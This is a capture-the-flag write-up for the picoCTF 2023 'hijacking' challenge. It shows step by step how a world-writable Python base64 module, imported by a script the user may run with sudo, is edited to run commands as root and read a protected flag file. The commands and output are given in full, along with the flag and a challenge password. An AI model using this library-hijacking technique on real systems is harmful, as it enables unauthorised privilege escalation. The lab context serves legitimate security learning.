# hijacking #
 
## Overview ##

Category: [Binary Exploitation](../)

Topics: Binary Exploitation, picoCTF-2023, Python Library Hijacking, Privilege Escalation

## Description ##
Getting root access can allow you to read the flag. Luckily there is a python file that you might like to play with.

## Approach ##
I am given the credentials to log into a remote linux machine. After connecting, I did the `ls` command to list the files in the directory. It didn't output any files in the directory. I then did the `ls -a` command to list all files, including hidden files:

    picoctf@challenge:~$ ls -a
    .  ..  .bash_logout  .bashrc  .cache  .profile  .server.py

.server.py is a file of interest. When I did `python3 .server.py`, I got the following output:

    sh: 1: ping: not found
    Traceback (most recent call last):
    File ".server.py", line 7, in <module>
        host_info = socket.gethostbyaddr(ip)
    socket.gaierror: [Errno -5] No address associated with hostname

Nothing of interest yet, it seems like the file can't find `ping`. I then used `cat` to view its contents:

    import base64
    import os
    import socket
    ip = 'picoctf.org'
    response = os.system("ping -c 1 " + ip)
    #saving ping details to a variable
    host_info = socket.gethostbyaddr(ip)
    #getting IP from a domaine
    host_info_to_str = str(host_info[2])
    host_info = base64.b64encode(host_info_to_str.encode('ascii'))
    print("Hello, this is a part of information gathering",'Host: ', host_info)

I initially thought that I needed to create a fake `ping` command and have it somehow print the flag or give me root access. After a few attempts, I decided to look to see if there were other directories that I can access. Doing `cd /`, I found that there was this file called `challenge`:

    picoctf@challenge:~$ ls /
    bin   challenge  etc   lib    lib64   media  opt   root  sbin  sys  usr
    boot  dev        home  lib32  libx32  mnt    proc  run   srv   tmp  var

When attempting to access the directory, I encountered a permission error. Inspecting its permissions showed that the directory is owned by root and has no read, write, or execute permissions granted to any user:

    picoctf@challenge:/$ ls -ld challenge
    d--------- 1 root root 6 Sep 26  2024 challenge

 I was sure that I needed to somehow get root access to read the content of the directory. So I decided to look at the modules that are import in `.server.py` and see if any of them are useful to use. Using python3, I did `python3 -c "import base64; print(base64)"` to see where base64 is located. I then check the permission of the file and discovered that it has read, write, and execute permissions:

    picoctf@challenge:~$ python3 -c "import base64; print(base64)"
    <module 'base64' from '/usr/lib/python3.8/base64.py'>
    picoctf@challenge:~$ ls -l /usr/lib/python3.8/base64.py
    -rwxrwxrwx 1 root root 20382 May 26  2023 /usr/lib/python3.8/base64.py

I then opened the file using `vi` and edited the content of the python file to include the following code:

    import os
    os.system("ls -l /challenge")

I then saved the file and executed the python file (`python3 .server.py`). Only to be meant with "ls: cannot open directory '/challenge': Permission denied", this led me to performing `sudo python3 .server.py` which led me to "Sorry, user picoctf is not allowed to execute '/usr/bin/python3 .server.py' as root on challenge." At this point, I decided to check the sudoers file to see if there were any permissions granted to the user (via `sudo -l`):

    picoctf@challenge:~$ sudo -l
    Matching Defaults entries for picoctf on challenge:
        env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

    User picoctf may run the following commands on challenge:
        (root) NOPASSWD: /usr/bin/python3 /home/picoctf/.server.py

The sudoers file only allows execution of `/usr/bin/python3` and `/home/picoctf/.server.py`. So I decided to try `sudo /usr/bin/python3 /home/picoctf/.server.py`. This led me discovering that there was a metadata file in the /challenge directory:

    picoctf@challenge:~$ sudo /usr/bin/python3 /home/picoctf/.server.py
    total 4
    -rw-r--r-- 1 root root 103 Sep 26  2024 metadata.json

I then went back to edit the base64.py file to include the following code:

    import os
    os.system("ls -l /challenge")
    os.system("cat /challenge/metadata.json")

Finally, when executing the python file, I was able to read the content of the metadata file:

    total 4
    -rw-r--r-- 1 root root 103 Sep 26  2024 metadata.json
    {"flag": "picoCTF{pYth0nn_libraryH!j@CK!n9_13cfd3cc}", "username": "picoctf", "password": "IhL436DlmJ"}sh: 1: ping: not found
    Traceback (most recent call last):
    File "/home/picoctf/.server.py", line 7, in <module>
        host_info = socket.gethostbyaddr(ip)
    socket.gaierror: [Errno -5] No address associated with hostname

Flag: picoCTF{pYth0nn_libraryH!j@CK!n9_13cfd3cc}

## Reflection ## 
This challenge was a good introduction to privilege escalation through Python library hijacking. It took some trial and error to understand what was happening. Initially, I thought I could hijack the `ping` command to spawn a shell, but later realized that approach was not feasible. This led me to inspect the Python modules imported by the script, where I discovered that the `base64` module was world-writable. By modifying this module, I was able to execute arbitrary commands when the script was run with root privileges, allowing me to list and read the contents of the protected `challenge` directory. All in all, this challenge taught me the importance of proper file permissions and how insecure Python module handling can lead to privilege escalation vulnerabilities. 



